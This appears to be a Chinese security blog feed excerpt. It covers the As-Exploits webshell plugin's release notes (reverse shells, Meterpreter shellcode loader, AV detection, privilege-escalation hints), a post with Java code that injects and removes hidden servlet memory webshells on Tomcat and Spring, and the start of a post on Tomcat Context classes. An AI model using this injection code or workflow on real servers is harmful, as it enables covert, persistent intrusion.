id="关于反射的坑">关于反射的坑</h4><p>在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。</p><p>去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候内存马管理模块报了一个这样的错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c</span><br></pre></td></tr></table></figure><p>定位一下问题出在这里</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616382288107-f70c8485-17a8-429c-8f71-dd36b10a8457.png" alt="img"></p><p>意思就是在StandardContext中找不到removeChild这个方法。</p><p>调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119790515-6bdbc527-d9a8-49e7-9eac-4fcd00991577.png" alt="img"></p><p>TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。</p><p>那为什么会找不到方法呢？这里要提一下反射中getMethods 跟getDeclaredMethods 的区别：</p><p>getMethods 获取所有公有方法（包括父类方法）</p><p>getDeclaredMethods 获取本类中的所有方法 (只拿本类中的)</p><p>哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。</p><p>所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119685039-03a1c1c3-961a-43ef-8baa-3ecb7c87c65f.png" alt="img"></p><p>在内存马模块同理，这里直接全部改了，不再用反射。</p><h4 id="addServletMapping的兼容性问题">addServletMapping的兼容性问题</h4><p>要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果：</p><p>tomcat7 只能addServletMapping</p><p>tomcat8 addServletMapping/addServletMappingDecoded都可以</p><p>tomcat9 只能addServletMappingDecoded</p><p>在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。</p><h4 id="Spring下运行截图">Spring下运行截图</h4><p>获取Servlet</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391669240-1a5f577e-4b65-408b-b77f-d90384cacd82.png" alt="img"></p><p>打入蚁剑内存马</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391697077-dbac2859-32ef-42c1-b786-f893f2f17dc5.png" alt="img"></p><p>再次获取Servlet，发现已经有了，并且在第一位。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391715445-48390742-00db-492a-8e89-22d383b12dc6.png" alt="img"></p><p>连接成功</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391788515-5dffd1ef-a9cb-4268-9978-8a59f05492f7.png" alt="img"></p><p>卸载Servlet</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391861347-dceff8d3-340c-41b2-844b-042c05a2f837.png" alt="img"></p><p>卸载后再次获取Servlet列表</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391870820-995e7229-a447-48df-b478-336157f2ebe6.png" alt="img"></p><p>虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。</p><h2 id="现有模块介绍">现有模块介绍</h2><h3 id="基本信息">基本信息</h3><p>获取当前服务端信息。</p><p>支持类型：php/jsp/aspx</p><p>php</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069591-9ff82346-c14d-4c6f-8753-b2dc9331769d.png" alt="img"></p><p>jsp</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069699-e5122eca-da20-4c47-89cb-dea7069bc741.png" alt="img"></p><p>aspx</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069786-fcdccbc9-9b8a-4741-b721-9d569f572c6d.png" alt="img"></p><h3 id="反弹Shell">反弹Shell</h3><p>跟MSF联动</p><p>支持类型：php/jsp/aspx</p><p>Payload目前支持以下类型：</p><ul><li><p>java/meterpreter/reverse_tcp</p></li><li><p>java/shell/reverse_tcp</p></li><li><p>java/meterpreter/bind_tcp</p></li><li><p>java/shell/bind_tcp</p></li><li><p>php/meterpreter/reverse_tcp</p></li><li><p>php/shell/reverse_tcp</p></li><li><p>php/meterpreter/bind_tcp</p></li><li><p>php/shell/bind_tcp</p></li><li><p>windows/meterpreter/reverse_tcp</p></li><li><p>windows/x64/meterpreter/reverse_tcp<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069884-b24ce1e4-5750-447a-9e94-fad6670cdc7a.png" alt="img"></p></li></ul><h3 id="内存马">内存马</h3><p>一键打入内存Webshell，由于时间仓促，目前仅支持Servlet型内存马。</p><p>支持类型：jsp</p><p>可打入的内存马种类：</p><ul><li><p>AntSword</p></li><li><p>Behinder</p></li><li><p>Godzilla-Base64</p></li><li><p>reGerog<br>组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。<br>其中AntSword类型支持Tomcat(5-9)、Spring。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723069978-fd956e7d-1a48-4e78-b647-3beec50634f5.png" alt="img"></p></li></ul><h4 id="打入哥斯拉内存马">打入哥斯拉内存马</h4><p>打入Godzilla-Base64内存马</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723070092-c189c186-b482-4a68-af3f-e7c5ee9495f2.png" alt="img"></p><p>在哥斯拉中连接成功</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723070168-2c0cf3c5-bae9-4276-a82b-7388206600fd.png" alt="img"></p><h3 id="杀软识别">杀软识别</h3><p>数据来源是key师傅的项目：<a href="https://github.com/gh0stkey/avList" target="_blank" rel="noopener">avList</a></p><p>通过<code>tasklist /svc</code>获取当前进程列表，识别出其中的杀软。</p><p>支持类型：php/jsp/aspx</p><p>目前支持手动跟自动两种获取方式：</p><ul><li>自动获取<br>自动执行<code>tasklist /svc</code>并分析回显数据。</li><li>手动获取<br>手动输入<code>tasklist /svc</code>的结果。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723070862-3a84df77-63d0-49bf-805c-6da597e33749.png" alt="img"></li></ul><h3 id="提权辅助">提权辅助</h3><p>通过<code>systeminfo</code>来获取补丁信息，从而给出提权建议。</p><p>支持类型：php/jsp/aspx</p><p>同样支持手动跟自动两种获取方式。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723070944-eee45771-078e-4459-8e7f-e9b3d3b1ef05.png" alt="img"></p><h3 id="屏幕截图">屏幕截图</h3><p>获取目标当前屏幕截图。</p><p>支持类型：jsp/aspx</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723071039-6cc28aba-0288-4990-9c22-b6af0acaafde.png" alt="img"></p><h3 id="ShellCode加载器">ShellCode加载器</h3><p>加载shellcode至内存运行。（shellcode为hex格式，且不能有多余空格或换行）</p><p>支持类型：aspx</p><p>以msf为例：msfvenom生成hex格式的shellcode</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723071167-d7d96f40-f62b-4671-8e00-af8c4a8a23cf.png" alt="img"></p><p>粘贴进输入框，点击<code>exploit</code></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723071267-a6fc7022-24df-45c6-b917-ee0bf8dd1970.png" alt="img"></p><p>收到Meterpreter会话</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723071688-17d8fdc8-3d84-460d-823a-55ad360ccae0.png" alt="img"></p><h3 id="Jar加载器">Jar加载器</h3><p>加载Jar到JVM内存中。过程中文件不落地，可用于上传数据库驱动等。</p><p>支持类型：jsp</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616723072100-b0da663d-a7b8-4b6d-a0c2-23a7900af9e8.png" alt="img"></p><h2 id="注意事项">注意事项</h2><p>本插件仅供合法的渗透测试以及爱好者参考学习，请勿用于非法用途，否则自行承担相关责任。</p>]]></content>
    
    <summary type="html">
    
      As-Exploits v1.2更新
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>As-Exploits内存马兼容Spring</title>
    <link href="https://yzddmr6.com/posts/As-Exploits-Memory-Shell-For-Spring/"/>
    <id>https://yzddmr6.com/posts/As-Exploits-Memory-Shell-For-Spring/</id>
    <published>2021-03-22T06:14:18.000Z</published>
    <updated>2021-08-08T12:53:15.429Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>最近在对As-Exploits的内存马部分做兼容Spring处理。原来只是照搬了哥斯拉的一些payload，现在需要深入研究一下了。</p><p>首先要Spring中默认没有pageContext的依赖，所以相关的依赖部分都要去除。蚁剑的jsp很早就不依赖pageContext了，相关文章以前也写过，不知道的同学可以翻一翻我的博客。</p><h2 id="过程">过程</h2><h3 id="关于反射的坑">关于反射的坑</h3><p>在研究过程中可以发现哥斯拉中的payload基本都是用反射实现的，这样的好处就是可以不添加任何依赖。这也是为什么哥斯拉只有8m的原因。</p><p>去除掉所有的pageContext后，在Spring中获取servlet没有问题，但是卸载的时候报了一个错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">public String unLoadServlet() &#123;</span><br><span class="line">    if (wrapperName != null &amp;&amp; wrapperName.length() &gt; 0 &amp;&amp; urlPattern != null &amp;&amp; urlPattern.length() &gt; 0) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Object o = getFieldValue(this.request.getServletContext(), &quot;context&quot;);</span><br><span class="line">            Field field = o.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">            field.setAccessible(true);</span><br><span class="line">            Object standardContext = getFieldValue(o, &quot;context&quot;);</span><br><span class="line">            Object wrapper = this.invoke(standardContext, &quot;findChild&quot;, wrapperName);</span><br><span class="line">            Class containerClass = Class.forName(&quot;org.apache.catalina.Container&quot;, false, standardContext.getClass().getClassLoader());</span><br><span class="line">            if (wrapper != null) &#123;</span><br><span class="line">                standardContext.getClass().getDeclaredMethod(&quot;removeChild&quot;, containerClass).invoke(standardContext, wrapper);</span><br><span class="line">                this.invoke(standardContext, &quot;removeServletMapping&quot;, urlPattern);</span><br><span class="line">                if (this.getMethodByClass(wrapper.getClass(), &quot;setServlet&quot;, Servlet.class) == null) &#123;</span><br><span class="line">                    this.transform(standardContext, urlPattern);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                return &quot;ok&quot;;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return &quot;not find wrapper&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception var8) &#123;</span><br><span class="line">            return var8.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return &quot;wrapperName or urlPattern is Null&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内存马管理模块报了一个这样的错误：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119753882-0ee874d4-9410-4bfa-8f7d-9fea66437fd6.png" alt="image.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15e0d5bERROR:// java.lang.NoSuchMethodException: org.springframework.boot.web.embedded.tomcat.TomcatEmbeddedContext.removeChild(org.apache.catalina.Container)adc1b2c</span><br></pre></td></tr></table></figure><p>定位一下问题出在这里</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616382288107-f70c8485-17a8-429c-8f71-dd36b10a8457.png" alt="image.png"></p><p>意思就是在StandardContext中找不到removeChild这个方法。</p><p>调试一下发现，Spring中获取到的StandardContext示例为其一个子类，叫做TomcatEmbeddedContext。虽然Spring中内置了Tomcat，但这个是Spring特有的。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119790515-6bdbc527-d9a8-49e7-9eac-4fcd00991577.png" alt="image.png"></p><p>TomcatEmbeddedContext继承了StandardContext，并且没有对removeChild进行改写，如果父类有这个方法应该是可以调用的。</p><p>开始以为是Spring在StandardContext中删掉了此方法，结果翻到父类StandardContext，发现跟普通的Tomcat一样，调用的org.apache.catalina.core.ContainerBase#removeChild</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119808075-e3a5a985-4f0c-431e-8a37-46ce92fd9e7b.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119839475-04996c7e-cf17-4cac-ba96-c614974e92be.png" alt="image.png"></p><p>org.apache.catalina.core.ContainerBase#removeChild</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119825985-41eb3f34-eaa5-4df0-8d24-8c8f04174f0d.png" alt="image.png"></p><p>后来发现先入为主了，问题不是出在没有这个方法上，而是出在反射的写法上。这里要提一下反射中getMethods 跟getDeclaredMethods 的区别：</p><p>getMethods 获取所有公有方法（包括父类方法）</p><p>getDeclaredMethods 获取本类中的所有方法 (只拿本类中的)</p><p>哥斯拉中用的getDeclaredMethod，也就是只能获取到本类中的方法，自然反射拿不到父类的removeChild。</p><p>所以解决办法要么把getDeclaredMethod换成getMethod，因为removeChild本来就是public的，要么就直接调用removeChild方法，不采用反射。在这里我采用了后者。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616119685039-03a1c1c3-961a-43ef-8baa-3ecb7c87c65f.png" alt="image.png"></p><p>在内存马模块同理，这里直接全部改了，不再用反射。</p><h3 id="addServletMapping的兼容性问题">addServletMapping的兼容性问题</h3><p>要注意的是，在添加servlet的过程中，会涉及到addServletMapping函数的兼容性问题，并且很多文章中并没有仔细分析具体的版本号。这里贴一下我研究的结果：</p><p>tomcat7 只能addServletMapping</p><p>tomcat8 addServletMapping/addServletMappingDecoded都可以</p><p>tomcat9 只能addServletMappingDecoded</p><p>在这里要么用反射，两种方法都try一下。在这里提供一个更好的解决办法，使用ApplicationServletRegistration这个类。ApplicationServletRegistration对wrapper做了封装，自动会处理两种方法的兼容性。</p><p>核心代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> public String addServlet() throws Exception &#123;</span><br><span class="line">        ServletContext servletContext = this.request.getServletContext();</span><br><span class="line">        ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;</span><br><span class="line">        Field applicationContextField = applicationContextFacade.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">        applicationContextField.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(applicationContextFacade);</span><br><span class="line">        Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">        standardContextField.setAccessible(true);</span><br><span class="line">        StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">        Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">//        改为一个有迷惑性的名字</span><br><span class="line">        wrapper.setName(name);</span><br><span class="line">        standardContext.addChild(wrapper);</span><br><span class="line"></span><br><span class="line">        wrapper.setServletClass(this.getClass().getName());</span><br><span class="line">        wrapper.setServlet(this);</span><br><span class="line"></span><br><span class="line">        ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);</span><br><span class="line">        registration.addMapping(path);</span><br><span class="line">        registration.setLoadOnStartup(1);</span><br><span class="line">        if (this.getMethodByClass(wrapper.getClass(), &quot;setServlet&quot;, Servlet.class) == null) &#123;</span><br><span class="line">            this.transform(standardContext, this.path);//兼容tomcat5/6</span><br><span class="line">            this.init((ServletConfig) getFieldValue(wrapper, &quot;facade&quot;));</span><br><span class="line">        &#125;</span><br><span class="line">        return &quot;Success&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="运行截图">运行截图</h3><p>获取Servlet</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391669240-1a5f577e-4b65-408b-b77f-d90384cacd82.png" alt="image.png"></p><p>打入蚁剑内存马</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391697077-dbac2859-32ef-42c1-b786-f893f2f17dc5.png" alt="image.png"></p><p>再次获取Servlet，发现已经有了，并且在第一位。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391715445-48390742-00db-492a-8e89-22d383b12dc6.png" alt="image.png"></p><p>连接成功</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391788515-5dffd1ef-a9cb-4268-9978-8a59f05492f7.png" alt="image.png"></p><p>卸载Servlet</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391861347-dceff8d3-340c-41b2-844b-042c05a2f837.png" alt="image.png"></p><p>卸载后再次获取Servlet列表</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616391870820-995e7229-a447-48df-b478-336157f2ebe6.png" alt="image.png"></p><h2 id="最后">最后</h2><p>虽然我们可以通过setLoadOnStartup把servlet放在第一位，但是面对需要鉴权的shiro等目标打入一个servlet内存马还是有不小的局限性。所以目前filter内存马依旧是主流。但是蚁剑是支持listener类型的，listener的优先级还在filter之上。所以以后可能直接跳过filter，直接加入listener的payload。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;最近在对As-Exploits的内存马部分做兼容Spring处理。原来只是照搬了哥斯拉的一些payload，现在需要深入研究一下了。&lt;/p&gt;&lt;p&gt;首
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>关于Tomcat中的三个Context的理解</title>
    <link href="https://yzddmr6.com/posts/tomcat-context/"/>
    <id>https://yzddmr6.com/posts/tomcat-context/</id>
    <published>2021-03-16T00:31:50.000Z</published>
    <updated>2021-03-15T08:34:32.605Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><p>p牛在知识星球里问了一个问题：Tomcat中这三个StandardContext、ApplicationContext、ServletContext都是干什么的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1615783546397-3d81b048-fdc8-47a9-b395-1dac64638e0a.png" alt="image.png"></p><p>skay师傅给出了自己的理解：<a href="https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/BrbkTiCuX4lNEir3y24lew</a></p><p>这里来讲一讲我的理解，说的不一定对，仅供参考。</p><h3 id="Context">Context</h3><p>context是上下文的意思，在java中经常能看到这个东西。那么到底是什么意思呢？</p><p>根据我的理解，如果把某次请求比作电影中的事件，那么context就相当于事件发生的背景。例如一部电影中的某个镜头中，张三大喊“奥利给”，但是只看这一个镜头我们不知道到底发生了什么，张三是谁，为什么要喊“奥利给”。所以就需要交代当时事情发生的背景。张三是吃饭前喊的奥利给？还是吃饭后喊的奥利给？因为对于同一件事情：张三喊奥利给这件事，发生的背景不同意义可能是不同的。吃饭前喊奥利给可能是饿了的意思，吃饭后喊奥利给可能是说吃饱了的意思。在WEB请求中也如此，在一次request请求发生时，背景，也就是context会记录当时的情形：当前WEB容器中有几个filter，有什么servlet，有什么listener，请求的参数，请求的路径，有没有什么全局的参数等等。</p><h3 id="ServletContext">ServletContext</h3><p>ServletContext是Servlet规范中规定的ServletContext接口，一般servlet都要实现这个接口。大概就是规定了如果要实现一个WEB容器，他的Context里面要有这些东西：获取路径，获取参数，获取当前的filter，获取当前的servlet等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">package javax.servlet;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">public interface ServletContext &#123;</span><br><span class="line">    String TEMPDIR = &quot;javax.servlet.context.tempdir&quot;;</span><br><span class="line">    String ORDERED_LIBS = &quot;javax.servlet.context.orderedLibs&quot;;</span><br><span class="line"></span><br><span class="line">    String getContextPath();</span><br><span class="line"></span><br><span class="line">    ServletContext getContext(String var1);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    /** @deprecated */</span><br><span class="line">    @Deprecated</span><br><span class="line">    Servlet getServlet(String var1) throws ServletException;</span><br><span class="line"></span><br><span class="line">    /** @deprecated */</span><br><span class="line">    @Deprecated</span><br><span class="line">    Enumeration&lt;Servlet&gt; getServlets();</span><br><span class="line"></span><br><span class="line">    /** @deprecated */</span><br><span class="line">    @Deprecated</span><br><span class="line">    Enumeration&lt;String&gt; getServletNames();</span><br><span class="line"></span><br><span class="line">    void log(String var1);</span><br><span class="line"></span><br><span class="line">    /** @deprecated */</span><br><span class="line">    @Deprecated</span><br><span class="line">    void log(Exception var1, String var2);</span><br><span class="line"></span><br><span class="line">    void log(String var1, Throwable var2);</span><br><span class="line"></span><br><span class="line">    String getRealPath(String var1);</span><br><span class="line"></span><br><span class="line">    String getServerInfo();</span><br><span class="line"></span><br><span class="line">    String getInitParameter(String var1);</span><br><span class="line"></span><br><span class="line">    Enumeration&lt;String&gt; getInitParameterNames();</span><br><span class="line"></span><br><span class="line">    boolean setInitParameter(String var1, String var2);</span><br><span class="line"></span><br><span class="line">    Object getAttribute(String var1);</span><br><span class="line"></span><br><span class="line">    Enumeration&lt;String&gt; getAttributeNames();</span><br><span class="line"></span><br><span class="line">    void setAttribute(String var1, Object var2);</span><br><span class="line"></span><br><span class="line">    void removeAttribute(String var1);</span><br><span class="line"></span><br><span class="line">    String getServletContextName();</span><br><span class="line"></span><br><span class="line">    Dynamic addServlet(String var1, String var2);</span><br><span class="line"></span><br><span class="line">    Dynamic addServlet(String var1, Servlet var2);</span><br><span class="line"></span><br><span class="line">    Dynamic addServlet(String var1, Class&lt;? extends Servlet&gt; var2);</span><br><span class="line"></span><br><span class="line">    Dynamic addJspFile(String var1, String var2);</span><br><span class="line"></span><br><span class="line">    &lt;T extends Servlet&gt; T createServlet(Class&lt;T&gt; var1) throws ServletException;</span><br><span class="line"></span><br><span class="line">    ServletRegistration getServletRegistration(String var1);</span><br><span class="line"></span><br><span class="line">    Map&lt;String, ? extends ServletRegistration&gt; getServletRegistrations();</span><br><span class="line"></span><br><span class="line">    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, String var2);</span><br><span class="line"></span><br><span class="line">    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Filter var2);</span><br><span class="line"></span><br><span class="line">    javax.servlet.FilterRegistration.Dynamic addFilter(String var1, Class&lt;? extends Filter&gt; var2);</span><br><span class="line"></span><br><span class="line">    &lt;T extends Filter&gt; T createFilter(Class&lt;T&gt; var1) throws ServletException;</span><br><span class="line"></span><br><span class="line">    FilterRegistration getFilterRegistration(String var1);</span><br><span class="line"></span><br><span class="line">    Map&lt;String, ? extends FilterRegistration&gt; getFilterRegistrations();</span><br><span class="line"></span><br><span class="line">    SessionCookieConfig getSessionCookieConfig();</span><br><span class="line"></span><br><span class="line">    void setSessionTrackingModes(Set&lt;SessionTrackingMode&gt; var1);</span><br><span class="line"></span><br><span class="line">    Set&lt;SessionTrackingMode&gt; getDefaultSessionTrackingModes();</span><br><span class="line"></span><br><span class="line">    Set&lt;SessionTrackingMode&gt; getEffectiveSessionTrackingModes();</span><br><span class="line"></span><br><span class="line">    void addListener(String var1);</span><br><span class="line"></span><br><span class="line">    &lt;T extends EventListener&gt; void addListener(T var1);</span><br><span class="line"></span><br><span class="line">    void addListener(Class&lt;? extends EventListener&gt; var1);</span><br><span class="line"></span><br><span class="line">    &lt;T extends EventListener&gt; T createListener(Class&lt;T&gt; var1) throws ServletException;</span><br><span class="line"></span><br><span class="line">    JspConfigDescriptor getJspConfigDescriptor();</span><br><span class="line"></span><br><span class="line">    ClassLoader getClassLoader();</span><br><span class="line"></span><br><span class="line">    void declareRoles(String... var1);</span><br><span class="line"></span><br><span class="line">    String getVirtualServerName();</span><br><span class="line"></span><br><span class="line">    int getSessionTimeout();</span><br><span class="line"></span><br><span class="line">    void setSessionTimeout(int var1);</span><br><span class="line"></span><br><span class="line">    String getRequestCharacterEncoding();</span><br><span class="line"></span><br><span class="line">    void setRequestCharacterEncoding(String var1);</span><br><span class="line"></span><br><span class="line">    String getResponseCharacterEncoding();</span><br><span class="line"></span><br><span class="line">    void setResponseCharacterEncoding(String var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ApplicationContext">ApplicationContext</h3><p>在Tomcat中，ServletContext规范的实现是ApplicationContext，因为门面模式的原因，实际套了一层ApplicationContextFacade。关于什么是门面模式具体可以看<a href="https://www.runoob.com/w3cnote/facade-pattern-3.html" target="_blank" rel="noopener">这篇文章</a>，简单来讲就是加一层包装。</p><p>其中ApplicationContext实现了ServletContext规范定义的一些方法，例如addServlet,addFilter等</p><h3 